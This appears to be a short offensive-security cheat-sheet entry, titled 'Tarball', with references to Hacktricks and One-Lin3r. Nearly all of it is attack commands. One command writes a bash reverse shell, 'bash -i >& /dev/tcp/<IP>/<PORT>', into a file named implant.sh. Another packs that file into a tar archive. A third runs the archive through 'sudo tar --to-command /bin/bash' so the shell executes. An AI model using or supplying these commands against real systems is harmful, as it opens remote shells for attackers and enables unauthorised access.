# Tarball

```
$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<IP>/<PORT> 0>&1' > implant.sh
$ tar -cvf implant.tar implant.sh
$ sudo -u $USER tar -xvf implant.tar --to-command /bin/bash
```

---
## References

- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)